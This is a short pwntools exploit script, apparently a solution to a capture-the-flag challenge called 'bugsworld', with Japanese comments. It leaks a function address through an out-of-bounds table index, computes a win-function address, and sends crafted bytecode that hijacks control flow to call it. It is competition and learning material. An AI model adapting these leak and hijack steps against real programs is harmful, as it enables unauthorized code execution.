from Crypto.Util.number import bytes_to_long
from pwn import *

def send_instructions(instructions):
    io.recvuntil(b'How many instructions in your bytecode?')
    io.sendlineafter(b'> ', str(len(instructions)).encode())
    io.recvuntil(b'Enter your instructions:')
    io.sendlineafter(b'> ', ' '.join(map(str, instructions)).encode())
    # io.interactive()

# io = process('./bugsworld')
# io = gdb.debug('./bugsworld', """
#     start
# """)
io = remote('chall.pwnoh.io', '13382')
context.binary = './bugsworld'

# 1. do_move_addr を leak させる
# instruction_table_addr - instruction_names_addr == 8160
# instruction_names は 32 バイト刻みなので
# instruction_names[255] == do_move_addr
send_instructions([255])
do_move_addr = bytes_to_long(io.recv(6)[::-1])
print(f'{hex(do_move_addr) = }')

# win_addr が得られる
win_addr = do_move_addr - 164

# 2. win_addr を呼び出す
# instruction_table_addr + 192 == bytecode_addr
# instruction_table[24] == bytecode[0]
send_instructions([6, 3, 6, 29, 6, win_addr])
io.interactive()